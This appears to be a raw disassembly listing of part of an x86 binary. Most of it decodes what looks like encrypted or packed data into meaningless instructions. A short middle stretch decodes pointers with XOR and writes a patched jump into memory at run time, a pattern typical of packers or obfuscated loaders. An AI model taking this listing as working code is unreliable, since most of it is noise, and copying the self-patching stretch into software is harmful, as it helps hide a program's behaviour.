  414358:	and    al,al
  41435a:	aas    
  41435b:	and    al,0x1b
  41435d:	imul   esp,DWORD PTR [eax],0x56
  414360:	xor    bl,BYTE PTR [edx+0x186d8570]
  414366:	lea    eax,[eax-0x5582c58b]
  41436c:	iret   
  41436d:	adc    eax,0x97f30f41
  414372:	adc    eax,0x97a9a443
  414377:	and    eax,0x2f144671
  41437c:	inc    esp
  41437d:	retf   0xc8c2
  414380:	cs callw 0x8d72
  414385:	ins    DWORD PTR es:[edi],dx
  414386:	cmp    esi,edi
  414388:	popa   
  414389:	mov    ebp,0xd6620c37
  41438e:	xchg   BYTE PTR [ecx-0x69],ah
  414391:	lods   eax,DWORD PTR ds:[esi]
  414392:	mov    ch,0xc9
  414394:	xchg   al,al
  414396:	sub    BYTE PTR [eax+0x41922f03],al
  41439c:	ficom  WORD PTR [eax-0x2066cc4a]
  4143a2:	cdq    
  4143a3:	or     BYTE PTR [ebp+0x1e],bh
  4143a6:	repz jo 0x41434d
  4143a9:	loope  0x414429
  4143ab:	xor    DWORD PTR [ecx-0xb3cd105],edx
  4143b1:	jbe    0x414422
  4143b3:	sub    BYTE PTR [eax],al
  4143b5:	dec    ecx
  4143b6:	add    dl,BYTE PTR [ebx-0x49]
  4143b9:	stos   DWORD PTR es:[edi],eax
  4143ba:	or     ecx,DWORD PTR [edi+0x7b]
  4143bd:	retf   
  4143be:	call   esp
  4143c0:	dec    edi
  4143c1:	xchg   edx,eax
  4143c2:	call   0x9ce5:0x90372509
  4143c9:	in     eax,dx
  4143ca:	inc    ebp
  4143cb:	jmp    0x414433
  4143cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143ce:	add    dl,BYTE PTR [edi]
  4143d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143d1:	sbb    BYTE PTR [ecx+ebp*1],bl
  4143d4:	adc    cl,BYTE PTR [eax]
  4143d6:	sahf   
  4143d7:	dec    esi
  4143d8:	outs   dx,DWORD PTR ds:[esi]
  4143d9:	and    ecx,DWORD PTR [ebx]
  4143db:	pop    ds
  4143dc:	or     esi,DWORD PTR [ecx-0x11ec5de8]
  4143e2:	stc    
  4143e3:	mov    esi,0x99714a8f
  4143e8:	mov    al,0x8
  4143ea:	pop    ecx
  4143eb:	xchg   BYTE PTR [edx-0x574d8be7],dh
  4143f1:	cli    
  4143f2:	dec    esi
  4143f3:	adc    al,0xf5
  4143f5:	mov    al,0x93
  4143f7:	sti    
  4143f8:	sbb    esi,DWORD PTR ds:0xd88f1e74
  4143fe:	cmp    cl,bh
  414400:	xchg   edx,eax
  414401:	stos   BYTE PTR es:[edi],al
  414402:	fwait
  414403:	sbb    eax,0xc213e677
  414408:	in     eax,0x71
  41440a:	aas    
  41440b:	xor    al,0xb1
  41440d:	pop    edi
  41440e:	(bad)  
  41440f:	repz test al,0xb3
  414412:	scas   eax,DWORD PTR es:[edi]
  414413:	pop    ecx
  414414:	dec    edx
  414415:	push   ebx
  414416:	(bad)  
  414417:	scas   eax,DWORD PTR es:[edi]
  414418:	sar    BYTE PTR [eax-0x6eb7dd08],cl
  41441e:	call   0xa6e6:0xc2bf17ae
  414425:	out    0xfe,eax
  414427:	addr16 jae 0x4143f4
  41442a:	mov    dh,0x61
  41442c:	in     eax,0xd6
  41442e:	mov    dl,0x59
  414430:	ret    
  414431:	xor    DWORD PTR [edi-0x2e],eax
  414434:	cmp    esi,esi
  414436:	cmp    ebp,ebp
  414438:	jmp    0x89af0c42
  41443d:	pop    esp
  41443e:	ja     0x41440e
  414440:	mov    dl,0x53
  414442:	push   ebp
  414443:	mov    ch,0x8e
  414445:	dec    edx
  414446:	std    
  414447:	cmp    dl,BYTE PTR [edx-0x1739751c]
  41444d:	fdivr  st(2),st
  41444f:	push   0x46e24cbe
  414454:	cmp    al,0x93
  414456:	inc    ebp
  414457:	mov    esi,0x25a38821
  41445c:	mov    bl,0xeb
  41445e:	and    eax,0x996f8bcc
  414463:	xor    al,0xc5
  414465:	add    esp,0x69
  414468:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414469:	sbb    BYTE PTR [edx+0x4a9d1382],dh
  41446f:	leave  
  414470:	push   0xdafe13df
  414475:	cmp    bl,BYTE PTR [edx+ecx*8-0x3a]
  414479:	ss push es
  41447b:	mov    dl,0x27
  41447d:	cmp    DWORD PTR [ecx],edx
  41447f:	jne    0x4144a6
  414481:	int    0x91
  414483:	xchg   edx,eax
  414484:	ror    ah,cl
  414486:	mov    cl,0x9a
  414488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414489:	xor    ch,BYTE PTR [ebp+0x142fe87f]
  41448f:	dec    esp
  414490:	cmp    eax,0xcba0fd0
  414495:	jmp    0xe280:0x9cd873d7
  41449c:	jge    0x414464
  41449e:	xor    cl,BYTE PTR [ecx+0x51]
  4144a1:	mov    ah,0xc7
  4144a3:	ret    0xc39a
  4144a6:	pop    edi
  4144a7:	lahf   
  4144a8:	mov    ds:0x1a786110,al
  4144ad:	pop    eax
  4144ae:	and    eax,0xd3059e74
  4144b3:	xchg   edi,eax
  4144b4:	jbe    0x41449c
  4144b6:	dec    ebx
  4144b7:	pop    eax
  4144b8:	jbe    0x4144d1
  4144ba:	xchg   edi,eax
  4144bb:	ret    
  4144bc:	or     BYTE PTR [ebx+ebx*4-0x24],bh
  4144c0:	mov    al,0x63
  4144c2:	cwde   
  4144c3:	cmp    al,0x25
  4144c5:	mov    ecx,0xa48c05c2
  4144ca:	and    al,BYTE PTR [ecx+0x15]
  4144cd:	mov    esi,0xc391637a
  4144d2:	pop    esi
  4144d3:	or     cl,dl
  4144d5:	adc    DWORD PTR [eiz*4+0x437fe3bd],edx
  4144dc:	mov    al,0x9d
  4144de:	xchg   BYTE PTR [edx+edx*8-0x7c85b6a5],ch
  4144e5:	dec    edx
  4144e6:	xchg   ecx,eax
  4144e7:	stc    
  4144e8:	add    DWORD PTR [esi],esi
  4144ea:	retf   
  4144eb:	daa    
  4144ec:	ret    
  4144ed:	fwait
  4144ee:	and    di,WORD PTR [edx]
  4144f1:	ins    DWORD PTR es:[edi],dx
  4144f2:	dec    ebp
  4144f3:	sub    DWORD PTR [ebp+0x7764c496],esi
  4144f9:	ror    DWORD PTR [edx],cl
  4144fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144fc:	mov    ?,WORD PTR [eax+0x45562991]
  414502:	adc    DWORD PTR [eax+0x6a579481],edx
  414508:	sti    
  414509:	mov    cl,0x4
  41450b:	repz cmc 
  41450d:	dec    edx
  41450e:	fwait
  41450f:	ja     0x41450b
  414511:	(bad)  
  414512:	mov    DWORD PTR [eax+0x53eb6ce5],edx
  414518:	jmp    0x1557:0x2d98a8fe
  41451f:	mov    BYTE PTR [ebp-0x57],dh
  414522:	xor    bh,BYTE PTR [edx+ebp*1]
  414525:	pop    esp
  414526:	cmp    dl,al
  414528:	nop
  414529:	adc    edx,DWORD PTR [edx-0x4a]
  41452c:	vpmaxsw xmm5,xmm6,XMMWORD PTR [ebp-0x6d5b040a]
  414534:	pop    esi
  414535:	dec    eax
  414536:	(bad)  
  414537:	mov    dl,0x99
  414539:	clc    
  41453a:	sub    eax,0x2a0f2a53
  41453f:	and    eax,0xc1ea1852
  414544:	cmp    DWORD PTR [esi],esi
  414546:	imul   eax,edx,0x60
  414549:	(bad)  
  41454b:	inc    esi
  41454c:	inc    ecx
  41454d:	dec    ebx
  41454e:	sbb    al,0xdc
  414550:	inc    ecx
  414551:	neg    DWORD PTR ds:0xf7f142fd
  414557:	and    DWORD PTR ds:0x72315809,0x11
  41455e:	push   esp
  41455f:	dec    edi
  414560:	leave  
  414561:	mov    WORD PTR [ecx],gs
  414563:	stc    
  414564:	sbb    edi,DWORD PTR [esi]
  414566:	pop    esi
  414567:	push   eax
  414568:	out    dx,al
  414569:	jmp    0x414588
  41456b:	ror    BYTE PTR [ebx],0xcd
  41456e:	test   DWORD PTR [eax],eax
  414570:	push   ecx
  414571:	xor    ebx,DWORD PTR [esi+0xb]
  414574:	push   es
  414575:	or     cl,BYTE PTR [edx-0x29986cbe]
  41457b:	xchg   ecx,eax
  41457c:	sti    
  41457d:	dec    edx
  41457e:	and    eax,0xb4a0913c
  414583:	int    0xa2
  414585:	imul   ecx,esp,0x7e
  414588:	out    dx,eax
  414589:	cmc    
  41458a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41458b:	dec    eax
  41458c:	pop    eax
  41458d:	push   edx
  41458e:	jbe    0x414531
  414590:	repnz retf 0x5d5b
  414594:	pushf  
  414595:	push   ecx
  414596:	push   eax
  414598:	addr16 xchg esp,eax
  41459a:	add    BYTE PTR [ebx+0x734c4e68],cl
  4145a0:	cmp    ecx,DWORD PTR [ebx+0x331b438a]
  4145a6:	xchg   ecx,eax
  4145a7:	mov    ecx,0x8c7e0513
  4145ac:	xchg   DWORD PTR ds:0x9c44524,edx
  4145b2:	pop    ds
  4145b3:	and    BYTE PTR [eax],dl
  4145b5:	lds    ebx,FWORD PTR [eax+eax*4+0x7f244293]
  4145bc:	cs push edx
  4145be:	mov    eax,0xa70e1025
  4145c3:	iret   
  4145c4:	pop    eax
  4145c5:	or     BYTE PTR [ecx],dl
  4145c7:	and    al,BYTE PTR [esi+0x1a487c3d]
  4145cd:	cdq    
  4145ce:	jb     0x4145b2
  4145d0:	dec    esp
  4145d1:	bound  ebp,QWORD PTR [esi-0x4560d369]
  4145d7:	jl     0x41461c
  4145d9:	pop    es
  4145da:	sbb    BYTE PTR ds:0xf0a90fca,dh
  4145e0:	inc    ebp
  4145e1:	lds    esp,FWORD PTR [ecx-0x36987dc8]
  4145e7:	repz leave 
  4145e9:	int3   
  4145ea:	mov    ds:0x57f64012,al
  4145ef:	push   0x3e
  4145f1:	lods   al,BYTE PTR ds:[esi]
  4145f2:	test   BYTE PTR ds:0xaa426126,dh
  4145f8:	daa    
  4145f9:	ins    DWORD PTR es:[edi],dx
  4145fa:	sbb    edi,eax
  4145fc:	hlt    
  4145fd:	data16 jp 0x4145f1
  414600:	add    eax,0xaeb40769
  414605:	jmp    0x8025e9fe
  41460a:	arpl   sp,dx
  41460c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41460d:	das    
  41460e:	cmp    ah,BYTE PTR [eax-0x77]
  414611:	push   0xffffffa3
  414613:	add    eax,0x4f20f240
  414618:	fld    QWORD PTR [ebx+0x5c61e0b6]
  41461e:	adc    eax,0x3be5cb8b
  414623:	or     ebx,0xffffff93
  414626:	in     al,0x3b
  414628:	sbb    al,0x72
  41462a:	test   al,0x4a
  41462c:	mov    ch,0x20
  41462e:	repz ret 
  414630:	shl    BYTE PTR [edx],0x21
  414633:	ror    BYTE PTR [ecx],cl
  414635:	nop
  414636:	(bad)  
  414637:	ins    DWORD PTR es:[edi],dx
  414638:	push   esi
  414639:	dec    eax
  41463a:	xchg   edi,eax
  41463b:	fbld   TBYTE PTR [esp+ebp*8-0x7b1cc80b]
  414642:	dec    edx
  414643:	into   
  414644:	mov    eax,0x5a5a216a
  414649:	cmp    al,0xa
  41464b:	jge    0x41469e
  41464d:	jmp    0x4145e6
  41464f:	cli    
  414650:	mov    ds:0x805a3d84,eax
  414655:	out    dx,eax
  414656:	xor    DWORD PTR [edi-0x6b],0xd25b80f6
  41465d:	cmp    bl,dh
  41465f:	cli    
  414660:	int    0x99
  414662:	and    cl,BYTE PTR [ecx]
  414664:	test   eax,0xf9c7596a
  414669:	lahf   
  41466a:	retf   0x9bd8
  41466d:	xor    eax,esi
  41466f:	add    eax,edi
  414671:	push   eax
  414672:	mov    eax,DWORD PTR [ebp-0x1c]
  414675:	xor    eax,esi
  414677:	add    eax,edi
  414679:	push   eax
  41467a:	mov    eax,DWORD PTR [ebp-0x10]
  41467d:	xor    eax,esi
  41467f:	add    eax,edi
  414681:	push   eax
  414682:	lea    eax,[ebp-0x90]
  414688:	push   eax
  414689:	push   DWORD PTR [ebp-0x20]
  41468c:	push   DWORD PTR [ebp-0x30]
  41468f:	call   0x40f89f
  414694:	test   eax,eax
  414696:	je     0x4146c7
  41469c:	lea    eax,[ebp-0x90]
  4146a2:	push   eax
  4146a3:	mov    eax,DWORD PTR [ebp-0x30]
  4146a6:	xor    eax,esi
  4146a8:	add    eax,edi
  4146aa:	push   eax
  4146ab:	mov    eax,DWORD PTR [ebp-0x2c]
  4146ae:	add    eax,0xaa
  4146b3:	push   eax
  4146b4:	mov    eax,DWORD PTR [ebp-0x2c]
  4146b7:	mov    eax,DWORD PTR [eax+0x198]
  4146bd:	push   DWORD PTR [eax]
  4146bf:	call   0x40867e
  4146c4:	mov    DWORD PTR [ebp-0x40],eax
  4146c7:	lea    eax,[ebp+0x4]
  4146ca:	mov    DWORD PTR [ebp-0x34],eax
  4146cd:	mov    eax,DWORD PTR [ebp-0x8]
  4146d0:	mov    eax,DWORD PTR [eax]
  4146d2:	mov    eax,DWORD PTR [eax]
  4146d4:	mov    eax,DWORD PTR [eax]
  4146d6:	test   eax,eax
  4146d8:	je     0x416aa8
  4146de:	lea    eax,[ebp-0xc]
  4146e1:	mov    DWORD PTR [ebp-0x4c],eax
  4146e4:	mov    eax,DWORD PTR [ebp-0x3c]
  4146e7:	mov    DWORD PTR [ebp-0xc],eax
  4146ea:	mov    eax,DWORD PTR [ebp-0x8]
  4146ed:	mov    eax,DWORD PTR [eax]
  4146ef:	mov    eax,DWORD PTR [eax]
  4146f1:	mov    eax,DWORD PTR [eax]
  4146f3:	sub    DWORD PTR [ebp-0xc],eax
  4146f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4146f9:	xor    ecx,esi
  4146fb:	mov    eax,0xffcd8d25
  414700:	sub    eax,ecx
  414702:	add    DWORD PTR [ebp-0xc],eax
  414705:	mov    eax,DWORD PTR [ebp-0xc]
  414708:	mov    ecx,DWORD PTR [ebp-0x8]
  41470b:	mov    ecx,DWORD PTR [ecx]
  41470d:	mov    ecx,DWORD PTR [ecx]
  41470f:	mov    ecx,DWORD PTR [ecx]
  414711:	mov    DWORD PTR [ecx+0x1],eax
  414714:	mov    al,BYTE PTR [ebp-0x1]
  414717:	mov    ecx,DWORD PTR [ebp-0x8]
  41471a:	mov    ecx,DWORD PTR [ecx]
  41471c:	mov    ecx,DWORD PTR [ecx]
  41471e:	mov    ecx,DWORD PTR [ecx]
  414720:	push   DWORD PTR [ebp-0x2c]
  414723:	xor    al,0x6f
  414725:	sub    al,0xd
  414727:	mov    BYTE PTR [ecx],al
  414729:	mov    eax,ds:0x423e9c
  41472e:	push   DWORD PTR [eax]
  414730:	push   DWORD PTR ds:0x4240f8
  414736:	push   DWORD PTR ds:0x423ea4
  41473c:	push   DWORD PTR ds:0x4240d8
  414742:	push   DWORD PTR ds:0x424160
  414748:	push   DWORD PTR [ebp-0x30]
  41474b:	jmp    0x416a9a
  414750:	jp     0x414751
  414752:	int    0x35
  414754:	ret    
  414755:	add    ecx,DWORD PTR [edx-0x41938645]
  41475b:	pop    ss
  41475c:	mov    edx,0x8cf055fe
  414761:	dec    eax
  414762:	popa   
  414763:	bound  edx,QWORD PTR [eax+0x5f]
  414766:	bound  esp,QWORD PTR [edx+0x4f]
  414769:	outs   dx,BYTE PTR ds:[esi]
  41476a:	xor    ah,ah
  41476c:	sub    eax,0x88097e42
  414771:	xchg   ebx,eax
  414772:	and    BYTE PTR [ecx-0x3b],dl
  414775:	pop    esp
  414776:	mov    esp,0x5a0c8b6c
  41477b:	arpl   bx,di
  41477d:	neg    bl
  41477f:	(bad)  
  414780:	cmc    
  414781:	and    al,0x9d
  414783:	pop    edi
  414784:	or     ah,BYTE PTR [esi]
  414786:	mov    BYTE PTR es:[esp+eax*2-0x38],al
  41478b:	rol    BYTE PTR [ebx-0x54d139cf],cl
  414791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414792:	add    ebp,esi
  414794:	push   esi
  414795:	js     0x414755
  414797:	xchg   ecx,eax
  414798:	pop    edx
  414799:	add    ch,BYTE PTR [esi+0x416ce579]
  41479f:	imul   BYTE PTR [edx]
  4147a1:	popa   
  4147a2:	mov    ebx,0x26f851a0
  4147a7:	xlat   BYTE PTR ds:[ebx]
  4147a8:	cli    
  4147a9:	push   0x72654e9
  4147ae:	fwait
  4147af:	out    0x5a,al
  4147b1:	test   eax,0x93cc4b1c
  4147b6:	mov    fs,WORD PTR [esi+0x15]
  4147b9:	(bad)  
  4147bc:	out    dx,al
  4147bd:	sub    eax,0x31312698
  4147c2:	cli    
  4147c3:	idiv   DWORD PTR [edi-0x68]
  4147c6:	mov    BYTE PTR [ebx],dl
  4147c8:	jg     0x41476a
  4147ca:	pop    ss
  4147cb:	gs stos DWORD PTR es:[edi],eax
  4147cd:	pop    edi
  4147ce:	mov    ah,BYTE PTR ds:0x1578a8bb
  4147d4:	(bad)  
  4147d5:	mul    BYTE PTR [ebp+edi*8+0x1c]
  4147d9:	lds    ebx,FWORD PTR [ebx+0x29d3fc77]
  4147df:	pop    esi
  4147e0:	inc    edx
  4147e1:	stos   BYTE PTR es:[edi],al
  4147e2:	in     al,dx
  4147e3:	mov    edx,0x1999c031
  4147e8:	cs int 0x22
  4147eb:	pop    ecx
  4147ec:	mov    WORD PTR [ecx],cs
  4147ee:	cs (bad) 
  4147f0:	shl    DWORD PTR [esi+eiz*4-0x5d],cl
  4147f4:	pop    esp
  4147f5:	jae    0x4147e7
  4147f7:	cmp    edi,ebp
  4147f9:	out    dx,eax
  4147fa:	sbb    eax,0x76ce60a1
  4147ff:	xlat   BYTE PTR ds:[ebx]
  414800:	(bad)  
  414801:	adc    BYTE PTR [edx+0x47],bl
  414804:	xor    eax,0x1c0c5bc
  414809:	in     eax,0xfb
  41480b:	mov    DWORD PTR [eax-0x3e],ecx
  41480e:	fdivr  st(5),st
  414810:	mov    ?,WORD PTR [eax+0x7b]
  414813:	loope  0x4147e7
  414815:	sub    esi,DWORD PTR [esi+0x37c01229]
  41481b:	sbb    eax,edi
  41481d:	or     eax,0x6a6d0488
  414822:	or     BYTE PTR [ebp+0x7127578e],bl
  414828:	fimul  DWORD PTR [edx-0x14545bc5]
  41482e:	mov    ecx,0xcbc6e5a1
  414833:	ja     0x414858
  414835:	add    ecx,DWORD PTR [ecx]
  414837:	mov    al,ds:0xe0297587
  41483c:	leave  
  41483d:	jbe    0x414882
  41483f:	inc    esp
  414840:	mov    al,ds:0x3c6bd1f8
  414845:	shr    DWORD PTR ds:[esi-0x5c],1
  414849:	std    
  41484a:	sbb    eax,0x9bf8ed37
  41484f:	inc    ecx
  414850:	fwait
  414851:	fs jle 0x414862
  414854:	fs in  eax,0x47
  414857:	xchg   ebp,eax
  414858:	xor    eax,0x335ab579
  41485d:	lods   al,BYTE PTR ds:[esi]
  41485e:	jmp    0x414856
  414860:	xchg   ebp,eax
  414861:	pop    eax
  414862:	data16 jns 0x41480e
  414865:	xchg   ebx,eax
  414866:	loopne 0x4147fd
  414868:	in     al,dx
  414869:	cli    
  41486a:	mov    edi,0xdd0fb667
  41486f:	repnz mov dl,0xe6
  414872:	leave  
  414873:	ja     0x414805
  414875:	outs   dx,DWORD PTR ds:[esi]
  414876:	jmp    0x1e21:0x7d560526
  41487d:	je     0x4148f0
  41487f:	and    eax,0xc74c5a13
  414884:	push   esp
  414885:	pushf  
  414886:	sub    ebp,DWORD PTR [ebx-0x39]
  414889:	in     al,0x59
  41488b:	or     eax,0xd3a78435
  414890:	push   ss
  414891:	mov    al,dl
  414893:	pop    ebp
  414894:	leave  
  414895:	imul   edi,DWORD PTR ds:0xfba58ae,0x20
  41489c:	sub    cl,BYTE PTR [esi+0x3066d097]
  4148a2:	ins    DWORD PTR es:[edi],dx
  4148a3:	jnp    0x4148dd
  4148a5:	pop    ebp
  4148a6:	and    BYTE PTR [edx+0x3a],cl
  4148a9:	in     ax,0xef
  4148ac:	cs cwde 
  4148ae:	dec    ecx
  4148af:	or     al,0xce
  4148b1:	test   al,0x9
  4148b3:	mov    dl,0xcc
  4148b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148b6:	push   ebp
  4148b7:	mov    ch,0x83
  4148b9:	fmul   QWORD PTR [eax-0x7f]
  4148bc:	test   eax,0xaf950a6a
  4148c1:	jns    0x4148f7
  4148c3:	sbb    eax,0xfa8dc781
  4148c8:	inc    eax
  4148c9:	sbb    BYTE PTR [edx],bl
  4148cb:	mov    al,0x8a
  4148cd:	add    DWORD PTR [ecx-0x1b],0xffffff87
  4148d1:	pop    edx
  4148d2:	mov    al,BYTE PTR [edx-0x5369a1f]
  4148d8:	es ficomp WORD PTR es:[ebp-0x4d5fb76]
  4148e0:	imul   esi,DWORD PTR [ecx+eiz*1+0x7194eb32],0x62
  4148e8:	dec    esi
  4148e9:	xchg   DWORD PTR [esi],edi
  4148eb:	pop    esi
  4148ec:	pop    ds
  4148ed:	jecxz  0x414894
  4148ef:	loop   0x414877
  4148f1:	mov    al,ds:0x947d8f64
  4148f6:	fucomip st,st(5)
  4148f8:	xchg   ebx,eax
  4148f9:	or     eax,0xa2ab2a77
  4148fe:	ret    
  4148ff:	dec    eax
  414900:	jmp    0x26bc:0x2df6e806
  414907:	adc    DWORD PTR [esi-0x34c79b22],0x4
  41490e:	mov    ch,0x6a
  414910:	mov    ebp,0x2451214a
  414915:	pop    es
  414916:	xor    eax,0x511e3bd6
  41491b:	enter  0x5384,0x95
  41491f:	mov    ecx,0x12381ea8
  414924:	dec    ebx
  414925:	sub    al,0xae
  414927:	and    DWORD PTR [ecx-0x30],esi
  41492a:	jb     0x41494b
  41492c:	lea    esp,[edi-0x43]
  41492f:	in     eax,dx
  414930:	jge    0x41493c
  414932:	jb     0x4148f1
  414934:	inc    edi
  414935:	outs   dx,DWORD PTR ds:[esi]
  414936:	(bad)  
  414937:	outs   dx,DWORD PTR ds:[esi]
  414938:	jmp    0x414992
  41493a:	add    ecx,DWORD PTR [ebp-0x63583ecd]
  414940:	loop   0x41493e
  414942:	loopne 0x414987
  414944:	jno    0x4149aa
  414946:	int    0x42
  414948:	xor    ebp,ecx
  41494a:	int    0x23
  41494c:	cmp    DWORD PTR [edx+eax*1+0x3b1f1546],esp
  414953:	std    
  414954:	mov    esp,0x60fa2ae5
  414959:	push   esp
  41495a:	inc    esp
  41495b:	js     0x4148f0
  41495d:	out    0x57,al
  41495f:	sbb    edx,0x88151a18
  414965:	jno    0x4149b7
  414967:	pop    eax
  414968:	pop    edx
  414969:	inc    esi
  41496a:	adc    bl,BYTE PTR [eax+eiz*8]
  41496d:	dec    ebp
  41496e:	dec    edi
  41496f:	sbb    DWORD PTR [ebx],esp
  414971:	jns    0x4148f3
  414973:	mov    ds:0x727a16ce,al
  414978:	sub    bl,BYTE PTR [esi+0x7c5494d2]
  41497e:	adc    eax,0xe1c28078
  414983:	loopne 0x4149d7
  414985:	and    DWORD PTR [edi-0x13f497c1],0x419a2d8b
  41498f:	pop    esi
  414990:	inc    ebx
  414991:	popa   
  414992:	lods   al,BYTE PTR ds:[esi]
  414993:	xor    al,0xf9
  414995:	or     ebx,DWORD PTR [ebp-0x50]
  414998:	icebp  
  414999:	jecxz  0x414a03
  41499b:	bound  ecx,QWORD PTR [edi]
  41499d:	call   0xcb53c548
  4149a2:	addr16 shr ebp,0x32
  4149a6:	ret    0x9903
  4149a9:	mov    ch,0xbf
  4149ab:	xor    esi,edx
  4149ad:	repnz fnstsw WORD PTR [ebx-0x4e413981]
  4149b4:	aas    
  4149b5:	es pop ss
  4149b7:	xor    eax,0xf478b4d8
  4149bc:	ds add eax,0x2f6c3bce
  4149c2:	pop    es
  4149c3:	addr16 loop 0x4149d7
  4149c6:	out    0x5c,eax
  4149c8:	inc    esi
  4149c9:	xor    al,0xae
  4149cb:	or     eax,0xbd3a86c0
  4149d0:	jne    0x4149b3
  4149d2:	inc    esp
  4149d3:	jp     0x4149a9
  4149d5:	mov    bh,0x87
  4149d7:	jecxz  0x414a21
  4149d9:	icebp  
  4149da:	xlat   BYTE PTR ds:[ebx]
  4149db:	(bad)  
  4149dc:	out    dx,al
  4149dd:	and    al,BYTE PTR [ebx]
  4149df:	pop    ecx
  4149e0:	pop    esp
  4149e1:	cmp    DWORD PTR [eax],edi
  4149e3:	arpl   WORD PTR [edi+0x14],di
  4149e6:	bound  eax,QWORD PTR [edx-0x60]
  4149e9:	scas   eax,DWORD PTR es:[edi]
  4149ea:	fbstp  TBYTE PTR [esi+0x7d7b3df2]
  4149f0:	jmp    0x4149c8
  4149f2:	mov    ch,0xf8
  4149f4:	(bad)  
  4149f5:	xor    eax,0xf428fac7
  4149fa:	and    al,0xa9
  4149fc:	dec    edi
  4149fd:	dec    ecx
  4149fe:	repz sub al,0x28
  414a01:	mov    eax,0x5234364e
  414a06:	xchg   edx,eax
  414a07:	test   BYTE PTR [esp+edx*4-0x5a1a9451],0xd3
  414a0f:	pop    ds
  414a10:	push   0xffffffbe
  414a12:	(bad)  
  414a14:	loopne 0x414a2a
  414a16:	mov    esi,0x9f54f63b
  414a1b:	sub    bh,0xa
  414a1e:	call   FWORD PTR [edi-0x613b08c2]
  414a24:	hlt    
  414a25:	push   cs
  414a26:	dec    esi
  414a27:	and    al,0x73
  414a29:	mov    cl,0xe7
  414a2b:	stos   BYTE PTR es:[edi],al
  414a2c:	or     al,BYTE PTR [ebx]
  414a2e:	or     DWORD PTR [esi],ecx
  414a30:	pop    ss
  414a31:	addr16 in al,dx
  414a33:	imul   ebp,ebp,0x8a5767e1
  414a39:	mov    dl,0xb4
  414a3b:	xchg   edi,eax
  414a3c:	push   es
  414a3d:	mov    dl,BYTE PTR [esi-0x2]
  414a40:	sub    eax,0xc0cdc9b4
  414a45:	pop    ebp
  414a46:	cmp    eax,0xe5dfb392
  414a4b:	ja     0x414a83
  414a4d:	and    al,0x20
  414a4f:	test   BYTE PTR [ebx+0x6f],ch
  414a52:	repnz pop eax
  414a54:	popf   
  414a55:	sbb    BYTE PTR [ecx],bh
  414a57:	xor    dh,BYTE PTR cs:[ecx]
  414a5a:	into   
  414a5b:	cmp    ch,BYTE PTR [esi]
  414a5d:	cmp    dl,BYTE PTR [ebx+0x44627cd2]
  414a63:	clc    
  414a64:	scas   al,BYTE PTR es:[edi]
  414a65:	xor    al,0x7d
  414a67:	fs or  al,0xc9
  414a6a:	sbb    dl,BYTE PTR [esi-0x58]
  414a6d:	fwait
  414a6e:	fs mov ebp,0x68779295
  414a74:	xchg   edx,eax
  414a75:	push   0xde444deb
  414a7a:	mov    gs,WORD PTR [ebx]
  414a7c:	aaa    
  414a7d:	push   ss
  414a7e:	push   ebx
  414a7f:	call   0x66c:0x9795c38c
  414a86:	mov    edi,0xa36ec6e1
  414a8b:	shl    ebx,1
  414a8d:	jmp    0x3466f263
  414a92:	das    
  414a93:	stos   DWORD PTR es:[edi],eax
  414a94:	mov    ds:0x26ae2a58,eax
  414a99:	jnp    0x414a1f
  414a9b:	sub    al,0xd8
  414a9d:	fst    QWORD PTR [ecx-0x3f]
  414aa0:	mov    dh,0x9
  414aa2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aa3:	mov    edx,0x40dbb06e
  414aa8:	sbb    eax,0x621f4a6f
  414aad:	lds    edi,FWORD PTR [esp+ebp*4]
  414ab0:	dec    ecx
  414ab1:	sbb    eax,0x88282d7b
  414ab6:	mov    esi,0xd7e752e0
  414abb:	pop    esp
  414abc:	push   ebp
  414abd:	call   0x8482:0xdc7658a0
  414ac4:	das    
  414ac5:	shr    BYTE PTR [esi+0x15d970a5],cl
  414acb:	lods   al,BYTE PTR ds:[esi]
  414acc:	lods   al,BYTE PTR ds:[esi]
  414acd:	add    esp,0x7c01c288
  414ad3:	and    al,0xaa
  414ad5:	or     DWORD PTR [ecx],edi
  414ad7:	pop    ebx
  414ad8:	mov    eax,ds:0xfdf9a5a1
  414add:	adc    eax,0x483a9919
  414ae2:	push   ds
  414ae3:	cmp    al,0x7e
  414ae5:	mul    ecx
  414ae7:	jmp    0xd395532a
  414aec:	dec    edx
  414aed:	jae    0x414ab5
  414aef:	xchg   DWORD PTR [edx+0x39],esi
  414af2:	pop    edi
  414af3:	push   eax
  414af4:	sbb    ebp,DWORD PTR [ecx-0x1a]
  414af7:	mov    eax,gs:0xa424c7df
  414afd:	cmp    edi,DWORD PTR [ebx+0x65]
  414b00:	pop    edx
  414b01:	dec    edx
  414b02:	fidiv  WORD PTR [ebp+0x57]
  414b05:	xchg   DWORD PTR [ebx+0x75],edi
  414b08:	xor    dl,bl
  414b0a:	jecxz  0x414b46
  414b0c:	mov    ds:0xc8a7004,al
  414b11:	ret    0x3782
  414b14:	xchg   ebx,eax
  414b15:	outs   dx,DWORD PTR ds:[esi]
  414b16:	add    DWORD PTR [edi+0x21],esi
  414b19:	push   cs
  414b1a:	shl    cl,cl
  414b1c:	mov    ds:0x5320e9e6,al
  414b21:	or     ebp,DWORD PTR [ebx]
  414b23:	cs call 0xddbf9c30
  414b29:	mov    BYTE PTR [ecx],ah
  414b2b:	mov    ds:0x32083bcc,al
  414b30:	cmc    
  414b31:	aaa    
  414b32:	jae    0x414add
  414b34:	mov    BYTE PTR [edi-0x31cc112b],bh
  414b3a:	sbb    ebx,DWORD PTR [edx-0x21]
  414b3d:	(bad)  
  414b3e:	std    
  414b3f:	xor    BYTE PTR [edi],0x89
  414b42:	into   
  414b43:	pop    ebx
  414b44:	add    ebx,DWORD PTR [ebx-0x16]
  414b47:	fstp   DWORD PTR ds:0xc4736fde
  414b4d:	mov    al,ds:0x71439447
  414b52:	pop    edx
  414b53:	mov    WORD PTR [edi],es
  414b55:	stos   BYTE PTR es:[edi],al
  414b56:	into   
  414b57:	lahf   
